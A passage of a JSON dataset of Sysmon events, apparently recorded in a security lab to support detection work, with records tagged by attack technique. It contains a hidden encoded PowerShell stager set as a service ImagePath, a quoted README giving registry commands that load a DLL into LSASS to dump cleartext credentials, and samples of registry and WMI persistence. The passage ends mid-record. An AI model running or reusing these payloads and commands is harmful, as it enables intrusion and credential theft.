      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "13",
        "Timestamp": "2021-02-23T21:56:50.655910400Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "win-dc-177.attackrange.local",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          },
          "EventID": "13",
          "Version": "2",
          "Level": "4",
          "Task": "13",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2021-02-23T21:56:50.655910400Z"
          },
          "EventRecordID": "120512",
          "Correlation": "",
          "Execution": {
            "ProcessID": "3064",
            "ThreadID": "2356"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "win-dc-177.attackrange.local",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "T1031,T1050",
          "EventType": "SetValue",
          "UtcTime": "2021-02-23 21:56:50.654",
          "ProcessGuid": "{64AF4F22-4083-6035-0A00-00000000AD01}",
          "ProcessId": "620",
          "Image": "C:\\Windows\\system32\\services.exe",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\78ae284\\ImagePath",
          "Details": "%%COMSPEC%% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwA3ADMAUABhAE8AQgBQACsASABQADQASwBmAGMAaQBNADcAUwBsAFEARQB0AEkAMAA5AEMAWQB6ADUAWQBjAEIAOAB3AEsAQgBtAEMAUwAwAEgATQBNAEkAVwBRAFkAVABZADQARQBrAEcANQB4AHIALwAvAGQAMwBaAFcATwBPAFgAcABPADcAegB0AHgAbABoAG8AawBzADcAYQA1ADIAbgAzADEAMgBWAHoAYQBWAEIAVgB0AHkAagA4AGcAZQBjAHkAZwBxAFAARgBJAHUAUABCAGEAZwB5ADEAegB1AHYATQBFAHMAaQBXADcAUgBaAHkAMwBuAGgAZwBHAFIAYQBsAHMAdABaAGcAcwBxAFoAeAB2AE8AeQBBAHcANwBEAHEAZABDAG8ARAA5AHkAWgB3AFAATQA4AFIAcgBwADUAeABIAG0AcwB6AFYAegBRAHAALwBtAFUAZgBLAGgAQgBLAGsAVABjAG0AcQBjAG4AZQBYAE8AawBxADAAdwBFAE4AaQBsAHMAdwBCAEwATAA2AEsAegBOAFoAVgBMADUAZwBpADQAUwBKADkAVQBOADUAcwBHAFcAMgBNAHYAbQBIADcANgBWAEEAOAA1AHAANABGAE0AdgA0AHMAdABLAHEAdABDADAAUABYAGMAOQA2AGoAUQBEAGYAUQBOAFAAUwAwAHAAcAA0AFcANwArAFkAbwBTAGkAZgA1AEEANQA3AE4AaQB5ADIAZAB6ADcAQgAvAEUANABqAG8AbQBTAHcAaQBvAEcAagBqAHEAcgBNAHMASQBWAGgARQBVADcAWQAzAHYAUwBWADMANwAvAFgAZgBOAG0AQgBRAHUAcABrAFYAegBHADIASgBmADYASgBvAGQAQwAwAG4AWABSAGMAZgAzAE4AUQBOADkATgA5AFMARgBvADMAaABEAGQAYQAzAG4ARQBjADQARQBjADIAWAB4AHkAUQB2AEsAbAA4AFcASAB4AFAAdAArADQAbgB3AHYAOQBWADAAegBEAHAARQB0AE4AaABqAGkAZQBEAHQASQBaAFQAWABWADAAVABWAFkARABnAEMAYgBhAG8AcQBoAGwAawBjAFQAZABkADkAawBPAGsAVwBmAGoAOQA3AGMAaAA0AEgAMAAxAHIAUgBvAEIAWgBKAHkAdAByAEUAcABqAHoAeABDAFIAYgBHAE4AQQA4AGUAbgA5ADkAUQBGAE4AVQAxAEEAKwBvAEsARgBaAG8AQQBUAG4ATQBxAFEAQgB5AGoAegBCAGYAUQBpADkAawB6ADEAOAB5AEQAMAAvAFQAegBZAG4AZgB5AHEAMwBhAG4AZQBwADcAcwBNADMARgA5AFYAMABrACsAVgBRAEcAbwBnAHUAWgBFAC8AYwBPAEoAWAA0AE8AZwBsAHYARQBuAE4AUQBUAGcALwBlAFgAOQBDAEwAZwBQACsAZgBpAEsAWQBrAGYAdQBlAGUANABXAHEARAB2AFgAcABBAGsAcwA2AGsANABEAHYAQwBWAGQAegBaADIAZQBUAFoARQBrAGgASABuADMAQQBoAEoAZgBvADMAYQBKAFMASAB2AFgAQQBDAFMAdwBaAGoAMQBVADYAUgB6AHkAawB4AHYAVABQAC8ASwBUAFgAWgBwAG8AaQAvADYAYQBoAGkAMAB6AHIAbwBKAE8AbQBKAC8AWABqAEYAawAwAGUAbQBlAGQATQBjADIAZABHADcAcwBBAGUAdABUACsAYgBoADUANwB2AFUASwA3AE8AMwA2ADYARwBCAG4AVwA5AGcARABiAGkAQQBLADgAOQBrAGgARgBlAGYAeQAxAG4AMQBQAFYAcABnAGsAYwB4AEUAKwB1AEQAbgA3AHAAMgBPAEsAQgBPADQANABDAE8AcABnAEMAZAAvAEsAeABtAHIAagAxADUAMQBLADIAbAB6AGwAVQBKADUARgAyAEEAVgAwAEEASgA0ADAAZABuADAAaAB6AHEAbQBoAFgAMAA2AEIAcgB3AFMANwArAEIAcAB1AGMAdQBsAEIAbgBOAHAAQQArAGwARgBXAGUAMwBxADIALwBGADUAYgBxAFAAaABjAGkAagBRAFEAaAAxAFQAdgBMAEkAcAB0AGkAbgBUAGgANQBWAEEAKwBFAGQAagBxAHEAaABaAE0AbABTACsAOQBQAGQAWAB1AGgATABqADIAQQBoAE0AMwBOAFQANAB4AFYASQBEADEAZgBYAFcAUQBBAFYARQB4AEwASQBMAHMAQQB3AHMAagBlAFUAZQBOAGgAWABxAE8AUgBSADIAMwBOAG8ATABiAGEAOQBSAGUAYQBDADkAaQBvAG0AZABlAHoANwBVAEgASgBnAEsAWQBLAGMAdwBJADcAQwB3AHAAYQBLAE0AOQB6AEoALwA1AFUAZgBSAHQARwBtADAAbABwAHYAZgBMAG8ARwA2AGEAUQBMAE4AWAAyADgAZwBKADUAegBxAEsAaQBFAGIAbgBoAEIASABlADEAdgAzAE0ANwBxAEoAQwAwAEsAaABWAFUARwAwAG8AbgBUAFEAQQBEAGIAWgB6AEsAUABIAGoAMAB1AG8AYQA5AHAAKwBaACsASQA5ACsALwBjACsANwBIAEYALwBPAEIAbQBuAGQATgBEAEkAdgBXAGsARQBDAGUAMQBXAEsAcAB5AFMAUwBTAEoARwBpADYAMwBSAHkAdwBUADUATABnAEUAMQBKAHEAYwByAFcAdABZADAATwBzAHIATwAyAGwAagB1AGwAYQArAEMAYgBkAFcAMwBGAHMATgByADMAbgBMAGoASgByAHQAYgBkAHMAYwB3AFMAKwBDAFgAMwBuAGIATgBMAHYAZAB6AHYAMgBtAGQAdAA4AGwAWgBuAGcAMwBhAEoAYwA2AHIAagBXADgAYQBWAHkARgB1ADkAQQBLAFIANwBWAFMAdQBWAGsAQwB1AFoAZAB0AHkAMwBTAHQANgBJADUAOQB1AFEAagBYAFYAeABmAE8AeABvAHIANgBzAEMAYwArAGIAdAB1AGkAWQBVAFcATgBhAHYAdAB5AHkANQByAFgAQwA2ADkAeQBzAEoAUABxAEQAKwBlADcAaQAvAG4AWQBhAG4ANgBjAHQANQBwAFgANwBVAGYAUgBWAFAASgB0AEsANgBvADEAdAAvAFUASwBnAC8AVgA3AEsANgBxAHoARAB1AGoAZABYAEcAKwBDADIAcwA2ADUAbwBtAGIAbgBtAG8ANgA3AFoARgBlAFcATgB4AFEAdgA5AHYASAAvAEgAdAArAFoAWQBiAC8AegBwAFMAUgBXAFAAWQBqAEIAcgByAHkAUQBUAHIAMwBmAHMAVQByAHkANAA3AEwAYwBhAEoAVQBIAFgAMQA5AGkASgBsAFoAVwAzAFAAOQBnAGgAcAB1AFkAUABJAHYAVgBjADAAeABXAGQAbgB3ADMANgBzAFEAZwA5AC8AegBzADIAMwBaAHQAYgAxADkAKwBIAGIAMABmAHUASwBRAFMAMwBMAEgAKwB6AHUAbABZADUAVwBhADMAWAB0AHIAVABuAGYATgB5AHUAUQBuADcANAA5AEgARAA4ADgAcQAyAFEAZgA2AGEATgA5AG4AZABRADcAQQBWAHIAYwBXAFYASABiAEwAeABqAGsAUwB3AGYAMgBIAGIAegB0ADYAQgB3AEsASgB4AC8ASwBVADgAdwBNAHoAWgBrAFoAZABrAFAAKwA0ADEANABPADcAVABNADgAQwBIAGwATABlAHQAbQB6AGIARQBGAGQAVABpAEwAdAA5ADYAQgBEAEEAbgA3AFYANwBjAFgAYwBZAEQATwA3AEgAcABtAE4ASABxADAAdgAzAG8AZwB2ADgAbAArADkAMwBUAHgAYQBiAGQASgBwAFUAdAB5AEYAOAB2AG8AMQBvAHMAOABKAFYAUABuAHUAMwBLADMAZABOAGkAUABDAFkAVgB1AFcALwBYAFgAZwBaAGQAMABuADgAaAA1AFgAYgBsAGYAVwBOAGMARwBkAGwAKwB2ACsAVwBXAFAAdgBUAHMAaAAxADIALwB1AFgAeQBZAHQAMwBhAGwAdQBiAG4ALwBjAHQAKwA0AHIAegA0ADEAYQAyAEoAawAzAGcAKwBIAFoAcwAzAEUAWgBtADAANABhAHUANgBIAHcAMgBHAE4AcgBZAGkAMwBKAGEAUABGADcAYQAxAGkAbgBjAHMANAB6AEoARwA5ADYAcwAyAC8ASQBmAGgAZgA4AEMAVQA2ADgAZwByAFkAQgBFAFIAVgArACsALwBlAEcAYQBxAC8ASAAwADgAbQA1AC8AdABwAE4AbwArAFAAMwA0AFgANQBIAHEAeQBWAFAAeQBpAE8ASgBpAGMAUgBQAG0ASABtAFcAMABPAHUAaAA3AGwAWQBZAGgAOABZAEMANABNAHEAYQB6AE4ATgB4AHAAdQBIAGMAVABOAGcAbgB0AEwAUQA5AGQAZABmAFMATQArAFUAQgA5AFMASAAxAHcATwA4AEwANwBMAGkAcgBQAG8AKwBJADIAcABBAHYAagBHAHAAWQBGAHkAbgBRADMAUQBLAFQAZQBnAEIAbAB1AFgATABWADEAYwBHAE8AZwByAEMAVgBFAHgAagBtAG8AZQB1AG0AdwB5AFIAUQA0AFQAWgBMAE0AMABFAFAAMwAzADYAQwB1AEgAbABUADAARABzADAAbQBBAGgAbAAzAGwAVQAyAHAAZABMAHAAWgBMADYAZgAxAFUAeQBjAHIAOABPAFMANQAxAHQAWQB2ADEAbwBMAHEAKwBHADYASQBrAG4AcAB6AGYANQB5AFUAMwBHAEEAWAAwAGUAQgBtAHYANgBIAHkAYgBnAGgAMAB2AC8ARwBWAG8ARgBYAGoASwBIAGoAOQBBAGwARAByADIATwBsADUASABUAFAAdQBkAHkAbABvAHQATwA5AG8AWAAzAEEAcQA5AE0AdQBrAFUAMwBDAGYAZQBFAHgARgB3AFcAVgBtAHcATwBUADkASwBrAHgAKwByAG4AMgBFAEMAVwBPAFUAYgBuAEcASAAxAEgAQgBRAGkAdgBLAHMAcQBYADgAQwA3AGwAaQAxAEEAMQBYAEoAUQArAHMANwArAGgASABmAFoAUwB4AFcALwBvAG4AaABJAEsAegA2AFIAQwBoADgAMgBCAHAAUgBUAG0AcABqAEsAZABHAEYASABDAHMAUABkAC8AMgAvAHkAMABvADcAYwBMAEEAQQBBAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA="
        }
      }
    },
    "14": {
      "event_id": "14",
      "length": 1221,
      "source_file": "datasets\\attack_techniques\\T1546\\compattelrunner_abuse\\compattelrunner_abuse.log",
      "event_index_in_file": 16,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>14</EventID><Version>2</Version><Level>4</Level><Task>14</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-02-11T19:13:06.9088871Z'/><EventRecordID>4903659</EventRecordID><Correlation/><Execution ProcessID='5088' ThreadID='6264'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ATTACKBOX.ATTACK_RANGE.LAN</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Suspicious,TelemetryTamper</Data><Data Name='EventType'>RenameKey</Data><Data Name='UtcTime'>2025-02-11 19:13:06.908</Data><Data Name='ProcessGuid'>{78198d03-a0f9-67ab-67aa-000000005f00}</Data><Data Name='ProcessId'>26104</Data><Data Name='Image'>C:\\Windows\\regedit.exe</Data><Data Name='TargetObject'>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\New Key #1</Data><Data Name='NewName'>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\SneakyPersistence</Data><Data Name='User'>ATTACK_RANGE\\ATTACKER</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "14",
        "Timestamp": "2025-02-11T19:13:06.9088871Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "ATTACKBOX.ATTACK_RANGE.LAN",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
          },
          "EventID": "14",
          "Version": "2",
          "Level": "4",
          "Task": "14",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2025-02-11T19:13:06.9088871Z"
          },
          "EventRecordID": "4903659",
          "Correlation": "",
          "Execution": {
            "ProcessID": "5088",
            "ThreadID": "6264"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "ATTACKBOX.ATTACK_RANGE.LAN",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "Suspicious,TelemetryTamper",
          "EventType": "RenameKey",
          "UtcTime": "2025-02-11 19:13:06.908",
          "ProcessGuid": "{78198d03-a0f9-67ab-67aa-000000005f00}",
          "ProcessId": "26104",
          "Image": "C:\\Windows\\regedit.exe",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\New Key #1",
          "NewName": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\SneakyPersistence",
          "User": "ATTACK_RANGE\\ATTACKER"
        }
      }
    },
    "15": {
      "event_id": "15",
      "length": 2128,
      "source_file": "datasets\\attack_techniques\\T1547.008\\atomic_red_team\\windows-sysmon.log",
      "event_index_in_file": 9,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>15</EventID><Version>2</Version><Level>4</Level><Task>15</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-08-22T20:17:16.246920700Z'/><EventRecordID>29869566</EventRecordID><Correlation/><Execution ProcessID='2184' ThreadID='3216'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-host-mhaag-attack-range-117</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2022-08-22 20:17:16.232</Data><Data Name='ProcessGuid'>{C2494F38-3D99-62FD-2B0B-000000006302}</Data><Data Name='ProcessId'>2664</Data><Data Name='Image'>C:\\Windows\\Explorer.EXE</Data><Data Name='TargetFilename'>C:\\Users\\Administrator\\Downloads\\LogonCredentialsSteal-master\\LogonCredentialsSteal-master\\README.md</Data><Data Name='CreationUtcTime'>2020-01-27 07:11:08.000</Data><Data Name='Hash'>MD5=2C8AF1CFD15B7941FF97470771F7AAB3,SHA256=017F23714E2D137C5097D32B531C0AE6388FAD40C8FA5EC22F841B0229D23AD6</Data><Data Name='Contents'># LogonCredentialsSteal  LOCAL AND REMOTE HOOK msv1_0!SpAcceptCredentials from LSASS.exe and DUMP DOMAIN/LOGIN/PASSWORD IN CLEARTEXT to text file.  run powershell v1.0  New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"c:\\temp\\lsass_lib.dll\" New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"\\\\\\\\share\\lulz\\lsass_lib.dll\"  or  To load our DLL, we can use a very simple Impacket Python script to modify the registry and  add a key to HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPt pointing to our DLL  hosted on an open SMB share, and then trigger the loading of the DLL using a call to hSamConnect RPC call.  look in remote_inject.py   will inject lib and dump any logon credentials to c:\\temp\\credentials.txt    thanks https://ired.team/ for research </Data><Data Name='User'>WIN-HOST-MHAAG-\\Administrator</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "15",
        "Timestamp": "2022-08-22T20:17:16.246920700Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "win-host-mhaag-attack-range-117",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          },
          "EventID": "15",
          "Version": "2",
          "Level": "4",
          "Task": "15",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2022-08-22T20:17:16.246920700Z"
          },
          "EventRecordID": "29869566",
          "Correlation": "",
          "Execution": {
            "ProcessID": "2184",
            "ThreadID": "3216"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "win-host-mhaag-attack-range-117",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "-",
          "UtcTime": "2022-08-22 20:17:16.232",
          "ProcessGuid": "{C2494F38-3D99-62FD-2B0B-000000006302}",
          "ProcessId": "2664",
          "Image": "C:\\Windows\\Explorer.EXE",
          "TargetFilename": "C:\\Users\\Administrator\\Downloads\\LogonCredentialsSteal-master\\LogonCredentialsSteal-master\\README.md",
          "CreationUtcTime": "2020-01-27 07:11:08.000",
          "Hash": "MD5=2C8AF1CFD15B7941FF97470771F7AAB3,SHA256=017F23714E2D137C5097D32B531C0AE6388FAD40C8FA5EC22F841B0229D23AD6",
          "Contents": "# LogonCredentialsSteal  LOCAL AND REMOTE HOOK msv1_0!SpAcceptCredentials from LSASS.exe and DUMP DOMAIN/LOGIN/PASSWORD IN CLEARTEXT to text file.  run powershell v1.0  New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"c:\\temp\\lsass_lib.dll\" New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"\\\\\\\\share\\lulz\\lsass_lib.dll\"  or  To load our DLL, we can use a very simple Impacket Python script to modify the registry and  add a key to HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPt pointing to our DLL  hosted on an open SMB share, and then trigger the loading of the DLL using a call to hSamConnect RPC call.  look in remote_inject.py   will inject lib and dump any logon credentials to c:\\temp\\credentials.txt    thanks https://ired.team/ for research",
          "User": "WIN-HOST-MHAAG-\\Administrator"
        }
      }
    },
    "16": {
      "event_id": "16",
      "length": 925,
      "source_file": "datasets\\attack_techniques\\T1112\\ransomware_disable_reg\\sysmon.log",
      "event_index_in_file": 1107,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>16</EventID><Version>3</Version><Level>4</Level><Task>16</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2022-03-08T10:17:30.958273200Z'/><EventRecordID>33120</EventRecordID><Correlation/><Execution ProcessID='5552' ThreadID='7060'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-tcontreras-attack-range-462.attackrange.local</Computer><Security UserID='S-1-5-21-3798679359-297722169-3327854505-500'/></System><EventData><Data Name='UtcTime'>2022-03-08 10:17:30.952</Data><Data Name='Configuration'>C:\\Program Files\\ansible\\AttackRangeSysmon.xml</Data><Data Name='ConfigurationFileHash'>SHA256=04596B4666E74A2242E4EBBD3CC5E0DA16F808A47E6C3C4CCE6C4BD2FE3DA95C</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "16",
        "Timestamp": "2022-03-08T10:17:30.958273200Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "win-dc-tcontreras-attack-range-462.attackrange.local",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          },
          "EventID": "16",
          "Version": "3",
          "Level": "4",
          "Task": "16",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2022-03-08T10:17:30.958273200Z"
          },
          "EventRecordID": "33120",
          "Correlation": "",
          "Execution": {
            "ProcessID": "5552",
            "ThreadID": "7060"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "win-dc-tcontreras-attack-range-462.attackrange.local",
          "Security": {
            "UserID": "S-1-5-21-3798679359-297722169-3327854505-500"
          }
        },
        "EventData": {
          "UtcTime": "2022-03-08 10:17:30.952",
          "Configuration": "C:\\Program Files\\ansible\\AttackRangeSysmon.xml",
          "ConfigurationFileHash": "SHA256=04596B4666E74A2242E4EBBD3CC5E0DA16F808A47E6C3C4CCE6C4BD2FE3DA95C"
        }
      }
    },
    "17": {
      "event_id": "17",
      "length": 1140,
      "source_file": "datasets\\attack_techniques\\T1055\\named_pipes\\windows-sysmon.log",
      "event_index_in_file": 24,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"5770385F-C22A-43E0-BF4C-06F5698FFBD9\"></Provider><EventID>17</EventID><Version>1</Version><Level>4</Level><Task>17</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-11-22T15:22:40.486503Z'></TimeCreated><EventRecordID>1658</EventRecordID><Correlation></Correlation><Execution ProcessID=\"2748\" ThreadID=\"3560\"></Execution><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>EC2AMAZ-2RSGUKB</Computer><Security UserID=\"S-1-5-18\"></Security></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>CreatePipe</Data><Data Name='UtcTime'>2023-11-22 15:22:40.486</Data><Data Name='ProcessGuid'>BA130F33-1CBD-655E-050B-000000009502</Data><Data Name='ProcessId'>3200</Data><Data Name='PipeName'>\\BurnPipe.{5E01FD79-766A-4023-AE0F-47C5CDFFD159}.Cache</Data><Data Name='Image'>C:\\Users\\user\\AppData\\Local\\Temp\\2\\{76281D4E-EA45-4974-8090-BA5ACBC43497}\\.cr\\tailscale-setup-1.54.0.exe</Data><Data Name='User'>EC2AMAZ-2RSGUKB\\user</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "17",
        "Timestamp": "2023-11-22T15:22:40.486503Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "EC2AMAZ-2RSGUKB",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
          },
          "EventID": "17",
          "Version": "1",
          "Level": "4",
          "Task": "17",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2023-11-22T15:22:40.486503Z"
          },
          "EventRecordID": "1658",
          "Correlation": "",
          "Execution": {
            "ProcessID": "2748",
            "ThreadID": "3560"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "EC2AMAZ-2RSGUKB",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "-",
          "EventType": "CreatePipe",
          "UtcTime": "2023-11-22 15:22:40.486",
          "ProcessGuid": "BA130F33-1CBD-655E-050B-000000009502",
          "ProcessId": "3200",
          "PipeName": "\\BurnPipe.{5E01FD79-766A-4023-AE0F-47C5CDFFD159}.Cache",
          "Image": "C:\\Users\\user\\AppData\\Local\\Temp\\2\\{76281D4E-EA45-4974-8090-BA5ACBC43497}\\.cr\\tailscale-setup-1.54.0.exe",
          "User": "EC2AMAZ-2RSGUKB\\user"
        }
      }
    },
    "18": {
      "event_id": "18",
      "length": 1141,
      "source_file": "datasets\\attack_techniques\\T1055\\named_pipes\\windows-sysmon.log",
      "event_index_in_file": 22,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"5770385F-C22A-43E0-BF4C-06F5698FFBD9\"></Provider><EventID>18</EventID><Version>1</Version><Level>4</Level><Task>18</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-11-22T15:22:42.473235Z'></TimeCreated><EventRecordID>1754</EventRecordID><Correlation></Correlation><Execution ProcessID=\"2748\" ThreadID=\"3560\"></Execution><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>EC2AMAZ-2RSGUKB</Computer><Security UserID=\"S-1-5-18\"></Security></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>ConnectPipe</Data><Data Name='UtcTime'>2023-11-22 15:22:42.473</Data><Data Name='ProcessGuid'>BA130F33-1CC2-655E-0C0B-000000009502</Data><Data Name='ProcessId'>7688</Data><Data Name='PipeName'>\\BurnPipe.{5E01FD79-766A-4023-AE0F-47C5CDFFD159}.Cache</Data><Data Name='Image'>C:\\Users\\user\\AppData\\Local\\Temp\\2\\{60E57E06-35F5-470F-8290-5DFB32B0E1C9}\\.be\\tailscale-setup-1.54.0.exe</Data><Data Name='User'>EC2AMAZ-2RSGUKB\\user</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "18",
        "Timestamp": "2023-11-22T15:22:42.473235Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "EC2AMAZ-2RSGUKB",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
          },
          "EventID": "18",
          "Version": "1",
          "Level": "4",
          "Task": "18",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2023-11-22T15:22:42.473235Z"
          },
          "EventRecordID": "1754",
          "Correlation": "",
          "Execution": {
            "ProcessID": "2748",
            "ThreadID": "3560"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "EC2AMAZ-2RSGUKB",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "-",
          "EventType": "ConnectPipe",
          "UtcTime": "2023-11-22 15:22:42.473",
          "ProcessGuid": "BA130F33-1CC2-655E-0C0B-000000009502",
          "ProcessId": "7688",
          "PipeName": "\\BurnPipe.{5E01FD79-766A-4023-AE0F-47C5CDFFD159}.Cache",
          "Image": "C:\\Users\\user\\AppData\\Local\\Temp\\2\\{60E57E06-35F5-470F-8290-5DFB32B0E1C9}\\.be\\tailscale-setup-1.54.0.exe",
          "User": "EC2AMAZ-2RSGUKB\\user"
        }
      }
    },
    "19": {
      "event_id": "19",
      "length": 1178,
      "source_file": "datasets\\attack_techniques\\T1546.003\\atomic_red_team\\windows-sysmon.log",
      "event_index_in_file": 11421,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>19</EventID><Version>3</Version><Level>4</Level><Task>19</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-06-16T21:47:37.969650700Z'/><EventRecordID>151831</EventRecordID><Correlation/><Execution ProcessID='1972' ThreadID='3648'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-host-14.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>WmiFilterEvent</Data><Data Name='UtcTime'>2021-06-16 21:47:37.961</Data><Data Name='Operation'>Created</Data><Data Name='User'>WIN-HOST-14\\Administrator</Data><Data Name='EventNamespace'> \"root\\\\CimV2\"</Data><Data Name='Name'> \"AtomicRedTeam-WMIPersistence-Example22\"</Data><Data Name='Query'> \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 